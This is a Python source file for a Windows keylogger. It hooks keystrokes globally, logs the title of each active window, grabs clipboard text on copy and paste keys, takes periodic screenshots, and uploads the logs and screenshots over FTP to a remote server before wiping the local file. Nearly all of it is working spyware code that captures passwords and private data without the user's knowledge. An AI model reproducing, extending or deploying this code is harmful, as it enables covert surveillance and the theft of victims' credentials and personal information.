import sys
import win32api, pythoncom
import PyHook3, os, time, random, smtplib, string, base64
import win32clipboard
from languages import *
from threading import Thread
from screenshotter import screen
import time

class key_logger:
	try:
		def __init__(self, path, ftp_handle,screens_path):
			# path in which we save logs
			self.path = path
			# path in which we save ScreenShots
			self.screens_path = screens_path
			# last window user typed in
			self.cur_window = ''
			# save log here until uploading
			self.temp_data = ''
			# ftp object through which we upload logs to serv.
			self.ftp_handle = ftp_handle
			# save start time to calculate interval between screenshots
			self.start_time = time.time()
			# Interval between screenshots
			self.interval = 80
			# Save clipboard data here
			self.clipboard = ''

			# make sure that log file exists
			try:
				f = open(self.path,'a',encoding="utf-8")
				f.close()
			except:
				f = open(self.path, 'w',encoding="utf-8")
				f.close()

		def on_keyboard_event(self, event):
			# if current window different from last we type in
			#print(event.Key)
			if self.cur_window != event.WindowName:
				# save current window
				self.cur_window = event.WindowName
				# ScreenShot and deal with it in a different thread
				screen_capture = Thread(target=screen, args=(self.screens_path,self.ftp_handle))
				screen_capture.start()
				self.temp_data += '\n[' + time.ctime() + ' Window: ' + event.WindowName + ']' + '\n'
				self.temp_data += '====================================\n'
			if event.Key == 'Return':
				self.temp_data += '\n'
			elif event.Key == 'Space':
				self.temp_data += ' '
			elif event.Key == 'V' or event.Key == 'C':
				clip = self.__clipBoard_data()
				if clip and clip != self.clipboard:
					self.clipboard = clip
					self.temp_data += '\n[' + time.ctime() + ' ClipBoard Data' + ']' + '\n'
					self.temp_data += '====================================\n'
					self.temp_data += self.clipboard +'\n'
			else:
				if event.Key is not None:
					self.temp_data += translate_key(event.Key)
			# when we reach certain len., save log to file and upload the log
			if len(self.temp_data) > 500:
				with open(self.path, 'a',encoding="utf-8") as f:
					f.write(self.temp_data)
					self.temp_data = ''
				upload_thread = Thread(target=self.__upload_logs)
				upload_thread.start()
			# if interval between screenshots passed
			if int(time.time() - self.start_time) >= self.interval:
				# save cur. time
				self.start_time = time.time()
				# ScreenShot and deal with it in a different thread
				screen_capture = Thread(target=screen, args=(self.screens_path, self.ftp_handle))
				screen_capture.start()

			return True

		def start_logger(self):
			self.hook = PyHook3.HookManager()
			self.hook.KeyDown = self.on_keyboard_event
			self.hook.HookKeyboard()
			pythoncom.PumpMessages()

		def __upload_logs(self):
			# generate name
			try:
				# remove forbidden chars
				name = (time.ctime().replace(' ','_')).replace(':','-')
				ans = self.ftp_handle.upload(self.path, 'keylogs',name)
				while not ans:
					pass
			except:
				pass
			finally:
				# empty the log file
				with open(self.path, 'w',encoding="utf-8") as s:
					new_txt = '\n[' + time.ctime() + ' Window: ' + self.cur_window + ']' + '\n'
					new_txt += '====================================\n'
					s.write(new_txt)
					return ans
		def __clipBoard_data(self):
			win32clipboard.OpenClipboard()
			if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
				cb = win32clipboard.GetClipboardData()
				win32clipboard.CloseClipboard()
				return cb
			else:
				return ''

	except Exception as e:
		pass